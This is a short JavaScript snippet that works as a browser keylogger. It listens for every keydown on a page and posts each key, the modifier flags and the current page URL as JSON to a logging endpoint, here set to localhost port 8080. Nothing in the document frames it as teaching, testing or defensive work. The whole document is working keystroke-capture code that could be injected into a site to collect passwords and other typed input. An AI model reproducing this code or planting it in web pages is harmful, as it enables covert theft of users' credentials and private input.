document.addEventListener('keydown', (event) => {
  key=event.key
  const xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://localhost:8080/log');
  xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
  xhr.send(JSON.stringify({
    key: event.key,
    window: window.location.href,
    keyCode: event,
    shiftKey: event.shiftKey,
    ctrlKey: event.ctrlKey,
    altKey: event.altKey,
    metaKey: event.metaKey,
  }));
});